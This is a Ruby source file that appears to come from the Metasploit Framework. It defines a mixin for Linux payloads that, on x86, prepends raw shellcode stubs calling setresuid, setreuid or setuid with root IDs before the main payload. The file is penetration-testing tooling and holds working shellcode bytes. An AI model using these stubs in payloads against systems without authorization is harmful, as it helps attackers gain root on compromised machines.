require 'msf/core'

###
#
# This class is here to implement advanced features for linux-based
# payloads. Linux payloads are expected to include this module if
# they want to support these features.
#
###
module Msf::Payload::Linux

	#
	# This mixin is chained within payloads that target the Linux platform.
	# It provides special prepends, to support things like chroot and setuid.
	#
	def initialize(info = {})
		ret = super(info)

		register_advanced_options(
			[
				Msf::OptBool.new('PrependSetresuid', [ false, "Prepend a stub that executes the setresuid(0,0,0) system call", "false"]),
				Msf::OptBool.new('PrependSetreuid', [ false, "Prepend a stub that executes the setreuid(0,0) system call", "false"]),
				Msf::OptBool.new('PrependSetuid', [ false, "Prepend a stub that executes the setuid(0) system call", "false"])
			], Msf::Payload::Linux)
		
		ret
	end
	
	
	#
	# Overload the generate() call to prefix our stubs
	#				
	def generate(*args)
		# Call the real generator to get the payload
		buf = super(*args)
		pre = ''
		
		test_arch = [ *(self.arch) ]
		
		# Handle all x86 code here
		if (test_arch.include?(ARCH_X86)) 

			if (datastore['PrependSetresuid'])
				pre << "\x31\xd2\x31\xc9\x31\xdb\x31\xc0\xb0\xa4\xcd\x80"  # setresuid(0, 0, 0)
			end	

			if (datastore['PrependSetreuid'])
				pre << "\x31\xc9\x31\xdb\x6a\x46\x58\xcd\x80" # setreuid(0, 0)
			end
									
			if (datastore['PrependSetuid'])
				pre << "\x31\xdb\x6a\x17\x58\xcd\x80" # setuid(0)
			end
		end
		
		return (pre+buf)
	end


end
